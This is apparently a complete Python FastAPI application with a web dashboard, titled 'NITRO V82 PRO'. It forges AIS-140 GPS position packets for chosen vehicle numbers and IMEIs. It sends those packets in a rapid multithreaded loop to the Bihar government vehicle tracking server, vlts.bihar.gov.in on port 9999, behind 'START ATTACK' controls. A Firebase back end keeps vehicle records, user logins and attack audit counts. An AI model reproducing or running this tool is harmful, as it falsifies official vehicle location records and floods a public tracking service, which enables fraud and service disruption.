import threading
import time
import socket
import httpx
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from fastapi import FastAPI, BackgroundTasks, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

# --- 1. CONFIGURATION (STRICTLY UNCHANGED) ---
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
TARGET_DOMAIN = "vlts.bihar.gov.in"
TARGET_PORT = 9999

stop_event = threading.Event()
stop_event.set()
packet_count = 0
executor = ThreadPoolExecutor(max_workers=25)

# --- 2. ENGINE LOGIC (STRICTLY UNCHANGED) ---
def sync_to_firebase(vno, data):
    try:
        with httpx.Client() as client:
            client.patch(f"{DB_URL}/Data_Records/{vno.upper()}.json", json=data)
    except: pass

def handshake_worker(tag, imei, vno, lat, lon):
    global packet_count
    try:
        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        date_str = now.strftime('%d%m%Y')
        time_str = now.strftime('%H%M%S')

        # 🔥 REAL STRING (AS PROVIDED BY USER - NO CHANGES)
        packet = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{date_str},{time_str},{lat},N,{lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\r\n"

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((TARGET_DOMAIN, TARGET_PORT))
            s.sendall(packet.encode())
            packet_count += 1
    except: pass

def nitro_firing_loop(v_up, i, lt, ln, t_up):
    target_tags = TAGS if t_up == "AUTO" else [t_up]
    while not stop_event.is_set():
        for tag in target_tags:
            if stop_event.is_set(): break
            executor.submit(handshake_worker, tag, i, v_up, lt, ln)
        time.sleep(0.05)

# --- 3. API ROUTES (STRICTLY UNCHANGED) ---
@app.get("/init")
async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
    global packet_count
    if stop_event.is_set():
        v_up, t_up = v.upper().strip(), t.upper().strip()
        packet_count = 0
        stop_event.clear()
        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Last_Attack": now.strftime('%Y-%m-%d %H:%M:%S')}
        background_tasks.add_task(sync_to_firebase, v_up, payload)
        threading.Thread(target=nitro_firing_loop, args=(v_up, i, lt, ln, t_up), daemon=True).start()
    return {"ok": True}

@app.get("/status")
def status(): return {"c": packet_count, "f": not stop_event.is_set()}

@app.get("/stop")
def stop(): stop_event.set(); return {"ok": True}

@app.get("/fetch_data")
async def fetch_api(vno: str):
    async with httpx.AsyncClient() as client:
        res = await client.get(f"{DB_URL}/Data_Records/{vno.upper()}.json")
        data = res.json()
        if data: return {"found": True, "imei": data.get('IMEI_No'), "lat": data.get('Lat'), "lon": data.get('Lon')}
    return {"found": False}

# --- 4. UI UPDATE (ADJUSTED AS PER ORDER) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NITRO V82 PRO | BIHAR VLTS</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { box-sizing: border-box; }
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
        .header { width: 100%; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: #111; border-bottom: 1px solid #0f0; }
        .logout { color: #f00; cursor: pointer; font-weight: bold; }
        .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:10px; text-align:center; position: relative; }
        .admin-msg { background: yellow; color: black; font-weight: bold; padding: 5px; width: 100%; font-size: 12px; margin-bottom: 10px; }
        .broadcast { color: cyan; font-size: 11px; margin: 10px 0; border: 1px dashed cyan; padding: 5px; }
        .audit-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 10px; }
        .audit-item { border: 1px solid #0f0; padding: 5px; font-size: 10px; border-radius: 5px; }
        .audit-item b { display: block; font-size: 14px; color: #fff; }
        input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
        .chk-container { display: flex; align-items: center; justify-content: flex-end; gap: 8px; margin: 15px 0; width: 100%; color: #fff; font-size: 12px; }
        #useDef { width: auto; margin: 0; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
        #map { width:100%; height:180px; margin-top:10px; border:1px solid #0f0; border-radius:10px; }
        .login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
    </style></head><body>

    <div id="loginPage" class="login-overlay">
        <h2 style="color:#0f0; letter-spacing:5px;">SYSTEM LOGIN</h2>
        <input type="text" id="l_mob" placeholder="MOBILE NUMBER" style="max-width:300px;">
        <input type="password" id="l_pass" placeholder="PASSWORD" style="max-width:300px;">
        <button onclick="doLogin()" style="max-width:300px; background:#0f0; color:#000; margin-top:20px;">ACCESS SYSTEM</button>
    </div>

    <div id="mainUI" style="display:none; width:100%;">
        <div class="header"><span>USER: <b id="u_name">---</b></span><span class="logout" onclick="location.reload()">LOGOUT</span></div>
        <div id="adminMsg" class="admin-msg">FETCHING ADMIN MESSAGE...</div>
        
        <div class="dashboard">
            <div class="audit-grid">
                <div class="audit-item">OK<b id="a_ok">0</b></div>
                <div class="audit-item">FAILED<b id="a_fail">0</b></div>
                <div class="audit-item">ERROR<b id="a_err">0</b></div>
                <div class="audit-item">TOTAL<b id="a_total">0</b></div>
            </div>

            <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
            <input type="text" id="i" placeholder="IMEI">
            <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
            
            <select id="tagSel"><option value="AUTO">AUTO (AIS-140)</option>""" + "".join([f'<option value="{t}">{t}</option>' for t in TAGS]) + """</select>
            
            <div class="chk-container">
                <label for="useDef">Use Profile Default Location</label>
                <input type="checkbox" id="useDef">
            </div>

            <button onclick="getLocation()" style="border-style:dashed;font-size:11px;">[[ GET CURRENT LOCATION ]]</button>
            <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;">START ATTACK</button>
            <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
            <button onclick="resetSys()" style="color:yellow;border-color:yellow;font-size:11px;">[[ RESET SYSTEM ]]</button>
            
            <div id="broadcast" class="broadcast">FETCHING BROADCAST...</div>
            <div id="map"></div>
            <div style="display:flex;justify-content:space-between;margin-top:10px;font-size:12px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map, marker, currentUser = null;
        const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";

        function doLogin() {
            let m = document.getElementById('l_mob').value;
            let p = document.getElementById('l_pass').value;
            fetch(`${DB}/users/${m}.json`).then(r=>r.json()).then(u=>{
                if(u && u.password == p) {
                    currentUser = m;
                    document.getElementById('u_name').innerText = u.name;
                    document.getElementById('loginPage').style.display = 'none';
                    document.getElementById('mainUI').style.display = 'block';
                    initMap(); startSync();
                } else { alert("INVALID ACCESS!"); }
            });
        }

        function initMap() { map = L.map('map').setView([25.63, 84.78], 13); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([25.63, 84.78]).addTo(map); }
        
        function getLocation() { navigator.geolocation.getCurrentPosition(p=>{ document.getElementById('lt').value = p.coords.latitude.toFixed(7); document.getElementById('ln').value = p.coords.longitude.toFixed(7); map.setView([p.coords.latitude, p.coords.longitude], 15); marker.setLatLng([p.coords.latitude, p.coords.longitude]); }); }
        
        function startSync() {
            setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=> {
                    document.getElementById('c').innerText = d.c;
                    document.getElementById('st_text').innerText = d.f ? 'FIRING' : 'IDLE';
                    document.getElementById('st_text').style.color = d.f ? 'red' : 'lime';
                });
                // Audit & Messages
                let today = new Date().toISOString().split('T')[0];
                fetch(`${DB}/User_Audit/${today}/${currentUser}.json`).then(r=>r.json()).then(ad=>{
                    if(ad) {
                        document.getElementById('a_ok').innerText = ad.ok || 0;
                        document.getElementById('a_fail').innerText = ad.fail || 0;
                        document.getElementById('a_err').innerText = ad.error || 0;
                        document.getElementById('a_total').innerText = (ad.ok||0)+(ad.fail||0)+(ad.error||0);
                    }
                });
                fetch(`${DB}/Admin_Settings.json`).then(r=>r.json()).then(s=>{
                    document.getElementById('adminMsg').innerText = s.message;
                    document.getElementById('broadcast').innerText = "BROADCAST: " + s.broadcast;
                });
            }, 2000);
        }

        async function smartFetch() {
            let v = document.getElementById('v').value.toUpperCase();
            let res = await fetch(`/fetch_data?vno=${v}`); let d = await res.json();
            if(d.found){
                document.getElementById('i').value = d.imei;
                let lat = document.getElementById('useDef').checked ? 25.638312 : d.lat;
                let lon = document.getElementById('useDef').checked ? 84.786629 : d.lon;
                document.getElementById('lt').value = lat; document.getElementById('ln').value = lon;
                map.setView([lat, lon], 15); marker.setLatLng([lat, lon]);
            }
        }
        function st() { let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value, t=document.getElementById('tagSel').value; fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${t}`); }
        function sp() { fetch('/stop'); }
        function resetSys() { fetch('/stop'); document.getElementById('v').value=''; document.getElementById('i').value=''; document.getElementById('lt').value=''; document.getElementById('ln').value=''; }
    </script></body></html>
    """
